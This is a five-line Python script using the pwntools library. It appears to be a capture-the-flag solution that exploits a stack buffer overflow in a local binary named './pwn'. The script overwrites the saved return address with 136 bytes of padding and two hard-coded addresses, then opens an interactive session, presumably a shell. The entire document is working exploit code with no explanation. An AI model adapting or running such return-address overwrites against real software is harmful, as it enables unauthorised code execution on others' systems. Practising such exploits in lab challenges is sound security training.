from pwn import *
p = process("./pwn")
payload = b"a"*136 + p64(0x4005d5) + p64(0x400586)
p.sendline(payload)
p.interactive()
